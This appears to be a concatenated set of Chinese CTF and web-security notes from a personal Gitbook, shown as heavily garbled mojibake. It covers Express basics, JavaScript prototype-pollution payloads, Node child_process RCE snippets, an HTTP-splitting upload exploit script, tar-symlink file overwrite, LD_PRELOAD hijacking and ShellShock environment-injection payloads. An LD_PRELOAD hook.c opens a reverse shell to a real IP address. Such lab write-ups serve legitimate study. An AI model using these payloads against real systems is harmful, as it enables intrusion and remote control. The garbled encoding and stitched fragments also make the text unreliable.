åˆ›å»ºæœåŠ¡å™¨ï¼šæœåŠ¡å™¨å¯ä»¥ç›‘å¬å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç±»ä¼¼äº Apache ã€Nginx ç­‰ HTTP æœåŠ¡å™¨ã€‚ æ¥æ”¶è¯·æ±‚ä¸å“åº”è¯·æ±‚ æœåŠ¡å™¨å¾ˆå®¹æ˜“åˆ›å»ºï¼Œå®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æˆ–ç»ˆç«¯å‘é€ HTTP è¯·æ±‚ï¼ŒæœåŠ¡å™¨æ¥æ”¶è¯·æ±‚åè¿”å›å“åº”æ•°æ®ã€‚ app.use('static',express.static('public')) # è®¿é—®è·¯ç”±/static/ï¼Œå¯ä»¥è®¿é—®åˆ°publicæ–‡ä»¶å¤¹ä¸‹çš„é™æ€æ–‡ä»¶ å¼•å…¥æ¨¡å— //requireå°±åƒimport var http = require(\"http\"); åˆ›å»ºæœåŠ¡å™¨ var http = require('http'); http.createServer(function (request, response) { // å‘é€ HTTP å¤´éƒ¨ // HTTP çŠ¶æ€å€¼: 200 : OK // å†…å®¹ç±»å‹: text/plain response.writeHead(200, {'Content-Type': 'text/plain'}); // å‘é€å“åº”æ•°æ® \"Hello World\" response.end('Hello World\\n'); }).listen(8888); // ç»ˆç«¯æ‰“å°å¦‚ä¸‹ä¿¡æ¯ console.log('Server running at http://127.0.0.1:8888/'); expressæ¡†æ¶ demo.js var express = require('express'); var app = express(); app.get('/',(req, res) => { res.send('test'); }) var server = app.listen(8081, function () { var host = server.address().address var port = server.address().port console.log(\"åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s\", host, port) }) const wiki = require('./wiki.js'); // ... app.use('/wiki', wiki); wiki.js // wiki.js - ç»´åŸºè·¯ç”±æ¨¡å— const express = require('express'); const router = express.Router(); // ä¸»é¡µè·¯ç”± router.get('/', (req, res) => { res.send('ç»´åŸºä¸»é¡µ'); }); // \"å…³äºé¡µé¢\"è·¯ç”± router.get('/about', (req, res) => { res.send('å…³äºæ­¤ç»´åŸº'); }); module.exports = router; request å’Œ response å¯¹è±¡çš„å…·ä½“ä»‹ç»ï¼š Request å¯¹è±¡ - request å¯¹è±¡è¡¨ç¤º HTTP è¯·æ±‚ï¼ŒåŒ…å«äº†è¯·æ±‚æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå‚æ•°ï¼Œå†…å®¹ï¼ŒHTTP å¤´éƒ¨ç­‰å±æ€§ã€‚å¸¸è§å±æ€§æœ‰ï¼š req.appï¼šå½“callbackä¸ºå¤–éƒ¨æ–‡ä»¶æ—¶ï¼Œç”¨req.appè®¿é—®expressçš„å®ä¾‹ req.baseUrlï¼šè·å–è·¯ç”±å½“å‰å®‰è£…çš„URLè·¯å¾„ req.body / req.cookiesï¼šè·å¾—ã€Œè¯·æ±‚ä¸»ä½“ã€/ Cookies req.fresh / req.staleï¼šåˆ¤æ–­è¯·æ±‚æ˜¯å¦è¿˜ã€Œæ–°é²œã€ req.hostname / req.ipï¼šè·å–ä¸»æœºåå’ŒIPåœ°å€ req.originalUrlï¼šè·å–åŸå§‹è¯·æ±‚URL req.paramsï¼šè·å–è·¯ç”±çš„parameters req.pathï¼šè·å–è¯·æ±‚è·¯å¾„ req.protocolï¼šè·å–åè®®ç±»å‹ req.queryï¼šè·å–URLçš„æŸ¥è¯¢å‚æ•°ä¸² req.routeï¼šè·å–å½“å‰åŒ¹é…çš„è·¯ç”± req.subdomainsï¼šè·å–å­åŸŸå req.accepts()ï¼šæ£€æŸ¥å¯æ¥å—çš„è¯·æ±‚çš„æ–‡æ¡£ç±»å‹ req.acceptsCharsets / req.acceptsEncodings / req.acceptsLanguagesï¼šè¿”å›æŒ‡å®šå­—ç¬¦é›†çš„ç¬¬ä¸€ä¸ªå¯æ¥å—å­—ç¬¦ç¼–ç  req.get()ï¼šè·å–æŒ‡å®šçš„HTTPè¯·æ±‚å¤´ req.is()ï¼šåˆ¤æ–­è¯·æ±‚å¤´Content-Typeçš„MIMEç±»å‹ Response å¯¹è±¡ - response å¯¹è±¡è¡¨ç¤º HTTP å“åº”ï¼Œå³åœ¨æ¥æ”¶åˆ°è¯·æ±‚æ—¶å‘å®¢æˆ·ç«¯å‘é€çš„ HTTP å“åº”æ•°æ®ã€‚å¸¸è§å±æ€§æœ‰ï¼š res.appï¼šåŒreq.appä¸€æ · res.append()ï¼šè¿½åŠ æŒ‡å®šHTTPå¤´ res.set()åœ¨res.append()åå°†é‡ç½®ä¹‹å‰è®¾ç½®çš„å¤´ res.cookie(nameï¼Œvalue [ï¼Œoption])ï¼šè®¾ç½®Cookie opition: domain / expires / httpOnly / maxAge / path / secure / signed res.clearCookie()ï¼šæ¸…é™¤Cookie res.download()ï¼šä¼ é€æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ res.get()ï¼šè¿”å›æŒ‡å®šçš„HTTPå¤´ res.json()ï¼šä¼ é€JSONå“åº” res.jsonp()ï¼šä¼ é€JSONPå“åº” res.location()ï¼šåªè®¾ç½®å“åº”çš„Location HTTPå¤´ï¼Œä¸è®¾ç½®çŠ¶æ€ç æˆ–è€…close response res.redirect()ï¼šè®¾ç½®å“åº”çš„Location HTTPå¤´ï¼Œå¹¶ä¸”è®¾ç½®çŠ¶æ€ç 302 res.render(view,[locals],callback)ï¼šæ¸²æŸ“ä¸€ä¸ªviewï¼ŒåŒæ—¶å‘callbackä¼ é€’æ¸²æŸ“åçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœåœ¨æ¸²æŸ“è¿‡ç¨‹ä¸­æœ‰é”™è¯¯å‘ç”Ÿnext(err)å°†ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚callbackå°†ä¼šè¢«ä¼ å…¥ä¸€ä¸ªå¯èƒ½å‘ç”Ÿçš„é”™è¯¯ä»¥åŠæ¸²æŸ“åçš„é¡µé¢ï¼Œè¿™æ ·å°±ä¸ä¼šè‡ªåŠ¨è¾“å‡ºäº†ã€‚ res.send()ï¼šä¼ é€HTTPå“åº” res.sendFile(path [ï¼Œoptions] [ï¼Œfn])ï¼šä¼ é€æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ -ä¼šè‡ªåŠ¨æ ¹æ®æ–‡ä»¶extensionè®¾å®šContent-Type res.set()ï¼šè®¾ç½®HTTPå¤´ï¼Œä¼ å…¥objectå¯ä»¥ä¸€æ¬¡è®¾ç½®å¤šä¸ªå¤´ res.status()ï¼šè®¾ç½®HTTPçŠ¶æ€ç  res.type()ï¼šè®¾ç½®Content-Typeçš„MIMEç±»å‹ åŸå‹é“¾æ±¡æŸ“ å‰ç½®çŸ¥è¯† https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html æ¯ä¸ªæ„é€ å‡½æ•°ï¼ˆjsä¸­æ„é€ å‡½æ•°å³æ˜¯ç±»ï¼‰éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype) å¯¹è±¡çš„__proto__å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡prototype JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶ ç±».prototype == å¯¹è±¡.__proto__ è¿™ä¸¤è€…æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡ æ¼æ´æˆå›  æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„\"é”®å\"èƒ½å¤Ÿè¢«æ“ä½œï¼Œèƒ½å¤Ÿä¿®æ”¹å¯¹è±¡çš„__proto__å±æ€§ã€‚ let o2 = {a: 1, \"__proto__\": {b: 2}} ä¸Šè¿°ä¸­__proto__ä¸æ˜¯o2çš„é”®åï¼Œæ˜¯å› ä¸º\"__proto__\": {b: 2}å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†åŸå‹å¯¹è±¡çš„å±æ€§b,æ‰€ä»¥o2çš„é”®åä¸ºaå’Œbã€‚ è€Œåœ¨jsonçš„è§£æä¸‹ï¼Œä¼šå°†\"__proto__\"è®¤ä¸ºæ˜¯é”®å å¸¸è§æ“ä½œ å¯¹è±¡merge å¯¹è±¡cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰ set-value å®ä¾‹ var express = require('express') var app = express(); let o1 = {}; o3 = {}; function merge(target, source) { for (let key in source) { if (key in source && key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } } function judge(){ if(o3.b==2) return \"success\"; else return \"false\"; } app.get('/',express.json(),(req,res)=>{ // var id =req.query.id; let o2 = JSON.parse(req.query.id) merge(o1, o2); res.send(judge()); }) var server = app.listen(8081, function () { var host = server.address().address var port = server.address().port console.log(\"åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s\", host, port) }) sodirty å…³é”®ä»£ç  const Admin = { \"password\":process.env.password?process.env.password:\"password\" } router.post(\"/getflag\", function (req, res, next) { if (req.body.password === undefined || req.body.password === req.session.challenger.password){ res.send(\"ç™»å½•å¤±è´¥\"); }else{ if(req.session.challenger.age > 79){ res.send(\"ç³Ÿè€å¤´å­åæ»´å¾ˆ\"); } let key = req.body.key.toString(); let password = req.body.password.toString(); if(Admin[key] === password){ res.send(process.env.flag ? process.env.flag : \"flag{test}\"); }else { res.send(\"å¯†ç é”™è¯¯ï¼Œè¯·ä½¿ç”¨ç®¡ç†å‘˜ç”¨æˆ·åç™»å½•.\"); } } }); if (req.body.attrkey === undefined || req.body.attrval === undefined) { res.send(\"ä¼ å‚æœ‰è¯¯\"); }else { let key = req.body.attrkey.toString(); let value = req.body.attrval.toString(); setFn(req.session.challenger, key, value); res.send(\"ä¿®æ”¹æˆåŠŸ\"); } éœ€è¦è®©ä¸‹é¢ä»£ç æˆç«‹ Admin[key] === req.session.challenger.password req.session.challengerçš„é”®åæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥åªéœ€è¦æ±¡æŸ“reqçš„åŸå‹å¯¹è±¡å±æ€§å€¼å°±å¯ä»¥æ±¡æŸ“Admin payload # ä½¿å¾—åŸå‹å¯¹è±¡å…·æœ‰pwdå±æ€§å€¼ attrkey=__proto__.pwd&value=18 # /update # å› ä¸ºAdminå¯¹è±¡æ²¡æœ‰pwdå±æ€§ï¼Œå°±ä¼šä»åŸå‹å¯¹è±¡å¯»æ‰¾ key=pwd&password=18 # /getflag Ez_Express æ¼æ´ç‚¹ å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼ˆcloneï¼‰å’Œsstiï¼ˆrenderï¼‰ router.post('/action', function (req, res) { if(req.session.user.user!=\"ADMIN\"){res.end(\"alert('ADMIN is asked');history.go(-1);\")} req.session.user.data = clone(req.body); res.end(\"alert('success');history.go(-1);\"); }); const clone = (a) => { return merge({}, a); } const merge = (a, b) => { for (var attr in b) { if (isObject(a[attr]) && isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a } router.get('/info', function (req, res) { res.render('index',data={'user':res.outputFunctionName}); }) éœ€è¦å…ˆç»•è¿‡ADMINç™»å½• if(safeKeyword(req.body.userid)){ res.end(\"alert('forbid word');history.go(-1);\") } req.session.user={ 'user':req.body.userid.toUpperCase(), 'passwd': req.body.pwd, 'isLogin':false } res.redirect('/'); function safeKeyword(keyword) { if(keyword.match(/(admin)/is)) { return keyword } return undefined } Fuzzä¸­çš„javascriptå¤§å°å†™ç‰¹æ€§ | ç¦»åˆ«æ­Œ \"Ä±\".toUpperCase() == 'I' \"Å¿\".toUpperCase() == 'S' \"â„ª\".toLowerCase() == 'k' RCE global.process.mainModule.constructor._load(â€˜child_processâ€™).exec('command') require( \"child_process\" ).spawnSync( 'command', ['arg'] ).stdout.toString() require( \"child_process\" ).spawnSync( 'command', ['arg'] ).stdout.toString() require(\"child_process\").execSync('command') require(\"child_process\").execSync('command') CRLF NodeJS ä¸­ Unicode å­—ç¬¦æŸåå¯¼è‡´çš„ HTTP æ‹†åˆ†æ”»å‡»-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° import urllib.parse import requests payload = ''' HTTP/1.1 POST /file_upload HTTP/1.1 Host: 127.0.0.1:8081 Content-Length: 298 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: 127.0.0.1:8081 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjgcOqgAmbNWkjnvS User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: 127.0.0.1:8081/?action=upload Accept-Encoding: gzip, deflate Accept-Language: zh,zh-CN;q=0.9 Connection: close ------WebKitFormBoundaryjgcOqgAmbNWkjnvS Content-Disposition: form-data; name=\"file\"; filename=\"1.pug\" Content-Type: ../template var x = eval(\"glob\"+\"al.proce\"+\"ss.mainMo\"+\"dule.re\"+\"quire('child_'+'pro'+'cess')['ex'+'ecSync']('ls /').toString()\") ------WebKitFormBoundaryjgcOqgAmbNWkjnvS-- GET / HTTP/1.1 test:'''.replace(\"\\n\", \"\\r\\n\") def payload_encode(raw): ret = u\"\" for i in raw: ret += chr(0x0100+ord(i)) return ret payload = payload_encode(payload) pro = {'http': 'http://127.0.0.1:8011', 'https': 'http://127.0.0.1:8011' } r = requests.get('http://77cb6778-efc8-49b4-9567-fdf189136b3a.node4.buuoj.cn:81/core?q=' + urllib.parse.quote(payload),proxies=pro, verify=False) ä¸­é—´éƒ¨åˆ†æ˜¯ä¼ªé€ çš„è¯·æ±‚ï¼Œéœ€è¦æ³¨æ„content-lengthï¼Œç›´æ¥æ”¾åœ¨burpä¸­å‘åŒ…ï¼Œburpä¼šè‡ªåŠ¨æ›´æ–°content-length Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-11-11 16:23:18 "},"06.WriteUp/CTF/NSSRound5.html":{"url":"06.WriteUp/CTF/NSSRound5.html","title":"NSS Round 5","keywords":"","body":"[NSSRound#V Team]PYRCE from flask import Flask, request, make_response import uuid import os # flag in /flag app = Flask(__name__) def waf(rce): black_list = '01233456789un/|{}*!;@#\\n`~\\'\\\"> æ€è·¯ä¸€ï¼Œç”¨/flagè¦†ç›–app.pyæ–‡ä»¶ï¼Œå†è®¿é—®/sourceè·¯ç”± è¿™é‡Œè¦†ç›–å®Œäº†ä¹‹åï¼Œè¿˜å¯ä»¥è®¿é—®è·¯ç”±çš„åŸå› æ˜¯debug=Falseï¼Œæ‰€ä»¥å³ä½¿è¦†ç›–äº†app.pyæ–‡ä»¶ï¼Œä½†æ˜¯flaskè¿è¡Œæ‰€ä½¿ç”¨çš„æ–‡ä»¶å¹¶æ²¡æœ‰å—åˆ°å½±å“ã€‚ è€Œå¦‚æœdebug=Trueï¼Œå½“æˆ‘ä»¬ä¿®æ”¹æ–‡ä»¶æ—¶ï¼Œflaskå°±ä¼šè‡ªåŠ¨é‡è½½æ–‡ä»¶ã€‚ æ­¤æ—¶è¦†ç›–flaskè¿è¡Œæ–‡ä»¶ï¼ˆæˆ‘æœ¬åœ°æ˜¯pyrce.pyï¼‰ æ§åˆ¶å° è®¿é—®/sourceè·¯ç”± æ€è·¯äºŒï¼Œåˆ©ç”¨å¯ä»¥è®¿é—®é™æ€æ–‡ä»¶ï¼Œå…ˆåˆ›å»ºstaticç›®å½•ï¼ˆflaskæ¡†æ¶ç»“æ„ï¼Œé™æ€æ–‡ä»¶æ”¾åœ¨staticç›®å½•ä¸‹ï¼‰ï¼Œå†å°†flagå¤åˆ¶åˆ°staticç›®å½•ï¼Œè®¿é—®/static/flagå°±èƒ½å¤Ÿä¸‹è½½flagæ–‡ä»¶ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-06-07 23:09:58 "},"06.WriteUp/CTF/NSSRound6.html":{"url":"06.WriteUp/CTF/NSSRound6.html","title":"NSS Round 6","keywords":"","body":"[NSSRound#6 Team]check V1--ä»»æ„æ–‡ä»¶ä¸Šä¼  æœåŠ¡ç«¯å¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹æ“ä½œï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹å‹ç¼©åŒ…å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¬¦å·é“¾æ¥è¾¾åˆ°ä»»æ„è¦†ç›–/ä¸Šä¼ æ–‡ä»¶çš„æ•ˆæœã€‚ ä¾‹å­ å‡è®¾æˆ‘ä»¬è¦è¦†ç›–/home/khaz/shellç›®å½•ä¸‹çš„1.shæ–‡ä»¶ é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆå¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘è¿™ä¸ªç›®å½•ï¼Œå¹¶å°†å…¶æ‰“åŒ…æˆå‹ç¼©åŒ…1ã€‚ ç„¶åæˆ‘ä»¬éœ€è¦å†åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åå­—ç›¸åŒçš„ç›®å½•ï¼Œå¹¶åœ¨è¿™ä¸ªç›®å½•ä¸‹åˆ›å»ºè¦è¦†ç›–çš„æ–‡ä»¶ã€‚ç„¶åå°†è¯¥ç›®å½•æ‰“åŒ…ä¸ºå‹ç¼©åŒ…2ã€‚ ç„¶åè§£å‹å‹ç¼©åŒ…1ï¼Œå¾—åˆ°testï¼Œç„¶åè§£å‹å‹ç¼©åŒ…2ï¼Œå…¶ä¸­test/clean.shï¼Œå› ä¸ºå½“å‰ç›®å½•ä¸‹testæ˜¯æŒ‡å‘/home/khaz/shellçš„ï¼Œæ‰€ä»¥å®é™…ä¸Šä¼šå°†clean.shè§£å‹åˆ°/home/khaz/shellä¸‹ä»è€Œè¦†ç›–åŸæ¥çš„clean.shã€‚ try: tar = tarfile.open(file_save_path, \"r\") tar.extractall(app.config['UPLOAD_FOLDER']) @app.route('/clean', methods=['POST']) def clean_file(): os.system('/tmp/clean.sh') return 'success' if __name__ == '__main__': app.run(host='0.0.0.0', debug=True, port=80) åšçš„æ—¶å€™ï¼Œå‘ç°åå¼¹shellä¸ç”Ÿæ•ˆï¼Œåœ¨æœ¬åœ°æµ‹è¯•åå‘ç°æ˜¯å› ä¸ºæ²¡æœ‰ç»™clean.shæƒé™ï¼Œæ‰€ä»¥è¦†ç›–åå°±ä¸èƒ½æ‰§è¡Œäº†ã€‚ psï¼šè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ€è·¯å°±æ˜¯æ—¢ç„¶å¯ä»¥ä»»æ„ä¸Šä¼ /è¦†ç›–æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥è¦†ç›–app.pyæ–‡ä»¶ã€‚ â€‹ è¿™æ˜¯å› ä¸ºæ¯æ¬¡ä¿®æ”¹å·¥ä½œç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œflaskéƒ½ä¼šè‡ªåŠ¨é‡è½½æ–‡ä»¶ã€‚ V2--ä»»æ„æ–‡ä»¶ä¸‹è½½ æœåŠ¡ç«¯å¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹æ“ä½œï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹å‹ç¼©åŒ…å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œå¹¶æä¾›ä¸‹è½½åŠŸèƒ½ã€‚å¯¼è‡´è§£å‹å‡ºæ¥çš„æ–‡ä»¶å¦‚æœæ˜¯ç¬¦å·é“¾æ¥æ–‡ä»¶å°±å¯ä»¥ä¸‹è½½ä»»æ„æ–‡ä»¶ã€‚ @app.route('/download', methods=['POST']) def download_file(): filename = request.form.get('filename') if filename is None or filename == '': return '?' filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename) if '..' in filename or '/' in filename: return '?' if not os.path.exists(filepath) or not os.path.isfile(filepath): return '?' with open(filepath, 'r') as f: return f.read() @app.route('/clean', methods=['POST']) def clean_file(): os.system('su ctf -c /tmp/clean.sh') return 'success' if __name__ == '__main__': app.run(host='0.0.0.0', debug=True, port=80) ä¸v1ç›¸æ¯”ä¸åŒç‚¹åœ¨äºsu ctf -c /tmp/clean.shé™åˆ¶äº†ç”¨æˆ·æƒé™ï¼Œä½†æ˜¯flaskè¿˜æ˜¯ä»¥rootæƒé™å¯åŠ¨çš„ï¼Œæ‰€ä»¥ä¸‹è½½åŠŸèƒ½è¿˜æ˜¯rootæƒé™ã€‚ æ„é€ ç¬¦å·é“¾æ¥æŒ‡å‘/flagï¼Œåˆ©ç”¨ä¸‹è½½åŠŸèƒ½å°±èƒ½å¤Ÿè¯»å–åˆ°flag import requests url = \"http://43.142.108.3:28187/download\" params = { \"filename\": \"test2\" } res = requests.post(url=url,data=params).text print(res) Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-06-07 23:09:17 "},"06.WriteUp/CTF/ç¯å¢ƒå˜é‡æ³¨å…¥.html":{"url":"06.WriteUp/CTF/ç¯å¢ƒå˜é‡æ³¨å…¥.html","title":"ç¯å¢ƒå˜é‡æ³¨å…¥","keywords":"","body":"æ¦‚å¿µ LD_PRELOAD æ˜¯ Linux ç³»ç»Ÿä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„ç›®çš„ã€‚ å…·ä½“çš„æ“ä½œæ­¥éª¤å¦‚ä¸‹ï¼š å®šä¹‰ä¸ç›®æ ‡å‡½æ•°å®Œå…¨ä¸€æ ·çš„å‡½æ•°ï¼ŒåŒ…æ‹¬åç§°ã€å˜é‡åŠç±»å‹ã€è¿”å›å€¼åŠç±»å‹ç­‰ã€‚ å°†åŒ…å«æ›¿æ¢å‡½æ•°çš„æºç ç¼–è¯‘ä¸ºåŠ¨æ€é“¾æ¥åº“ã€‚ é€šè¿‡å‘½ä»¤ export LD_PRELOAD=\"åº“æ–‡ä»¶è·¯å¾„\"ï¼Œè®¾ç½®è¦ä¼˜å…ˆæ›¿æ¢åŠ¨æ€é“¾æ¥åº“å³å¯ã€‚ æ›¿æ¢ç»“æŸï¼Œè¦è¿˜åŸå‡½æ•°è°ƒç”¨å…³ç³»ï¼Œç”¨å‘½ä»¤unset LD_PRELOAD è§£é™¤ ä¾‹å­ åŠ«æŒlså‘½ä»¤ æŸ¥æ‰¾lså‘½ä»¤æ‰§è¡Œæ—¶è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•°ï¼Œä¾‹å¦‚è°ƒç”¨äº†strncmp payload #include #include #include void payload() { system(\"id\"); } int strncmp(const char *__s1, const char *__s2, size_t __n) { if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); payload(); } è¿™é‡Œå‡½æ•°çš„å®šä¹‰å¯ä»¥æ ¹æ®æŠ¥é”™ä¿¡æ¯è¿›è¡Œç¡®å®š ä»æºç ä¸­æ‰¾åˆ°çš„ ç¼–è¯‘å½¢æˆ.soæ–‡ä»¶ gcc -shared -fPIC hook_strncmp.c -o hook_strncmp.so ç¯å¢ƒå˜é‡è®¾ç½®ä¼˜å…ˆçº§ export LD_PRELOAD=$PWD/hook_strncmp.so æ‰§è¡Œå‘½ä»¤ç»“æœ æ›´ä¸ºç®€å•çš„åŠ«æŒ GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ attribute((constructor))ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨åŠ¨æ€é“¾æ¥åº“ä¸­ï¼Œé‚£ä¹ˆä¸€æ—¦åŠ¨æ€é“¾æ¥åº“è¢«ç³»ç»ŸåŠ è½½ï¼Œå°†ç«‹å³æ‰§è¡Œ _attribute((constructor)) ä¿®é¥°çš„å‡½æ•°ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±ä¸ç”¨å±€é™äºä»…åŠ«æŒæŸä¸€å‡½æ•°ï¼Œè€Œåº”è€ƒè™‘åŠ«æŒåŠ¨æ€é“¾æ¥åº“äº†ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯åŠ«æŒäº†ä¸€ä¸ªæ–°è¿›ç¨‹ã€‚ hook.c #include #include #include __attribute__ ((__constructor__)) void preload (void){ unsetenv(\"LD_PRELOAD\"); system(\"bash -c 'bash -i >& /dev/tcp/120.77.73.212/2333 0>&1'\"); //system(\"echo \\\"\\\" > /var/www/html/shell.php\"); } ç¼–è¯‘å½¢æˆ.soæ–‡ä»¶ gcc -shared -fPIC hook.c -o hook.so PHPä¸­ RCE ç»•è¿‡disable_function æ¡ä»¶ èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶ï¼Œåªè¦æ˜¯.soæ–‡ä»¶ï¼Œä»»æ„åç¼€åéƒ½å¯ä»¥è§£æ èƒ½å¤Ÿè®¾ç½®ç¯å¢ƒå˜é‡LD_PRELOAD æœ‰å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„ PHP å‡½æ•°ï¼ˆè¿™æ ·æ‰èƒ½å¤ŸåŠ«æŒï¼‰ å¦‚ä½•æ‰¾åˆ°å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„ PHP å‡½æ•° æŸ¥çœ‹PHPå‡½æ•°è°ƒç”¨æ—¶çš„shellæ“ä½œ strace -f php test.php 2>&1 | grep -A2 -B2 execve test.php s å¯ä»¥çœ‹åˆ°æ‰§è¡Œmailå‡½æ•°æ—¶å®é™…æ˜¯å¯åŠ¨äº†ä¸€ä¸ªæ–°çš„è¿›ç¨‹æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤sendmail å…¶ä»–å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„phpå‡½æ•° error_log(\"\", 1, \"\", \"\"); $img = new Imagick('/tmp/a5edb30f575fb2f877a19b2f62a2e720/whoami.wmv'); system imap_mail() mb_send_mail() æ–‡ä»¶ä¸Šä¼ ç»•è¿‡disable_function https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD æ— ä¸Šä¼ æ–‡ä»¶æ“ä½œ--ShellShockï¼ˆCVE-2014-6271ï¼‰ ä»¥ä¸‹æµ‹è¯•ç¯å¢ƒ $val) { putenv(\"{$key}={$val}\"); } //... ä¸€äº›å…¶ä»–ä»£ç  system('echo hello'); # ç›¸å½“äºsh -c echo \"command\" ?> payload åªé€‚ç”¨äºredhatç³»åˆ—--centos redhatç³»åˆ—shæŒ‡å‘bash debianç³»åˆ—æŒ‡å‘dash Bashæ²¡æœ‰ä¿®å¤ShellShockæ¼æ´ï¼šç›´æ¥ä½¿ç”¨ShellShockçš„POCè¿›è¡Œæµ‹è¯•ï¼Œä¾‹å¦‚TEST='() { :; }'; id; Bash 4.4ä»¥å‰ï¼šenv $'BASH_FUNC_echo()=() { id; }' bash -c \"echo hello\" Bash 4.4åŠä»¥ä¸Šï¼šenv $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello' æœ¬åœ°æµ‹è¯• # system('echo hello'); # ç›¸å½“äºsh -c echo \"command\" ?envs[BASH_FUNC_echo()]=() { ls; } å…¶ä»–æƒ…å†µä¸‹çš„ç¯å¢ƒå˜é‡æ³¨å…¥payload redhat PROMPT_COMMANDï¼šå¯ä»¥åœ¨bashäº¤äº’å¼ç¯å¢ƒä¸‹æ‰§è¡Œä»»æ„å‘½ä»¤ PROMPT_COMMAND='id' bash é€šç”¨ ENVï¼šå¯ä»¥åœ¨sh -i -cçš„æ—¶å€™æ³¨å…¥ä»»æ„å‘½ä»¤ 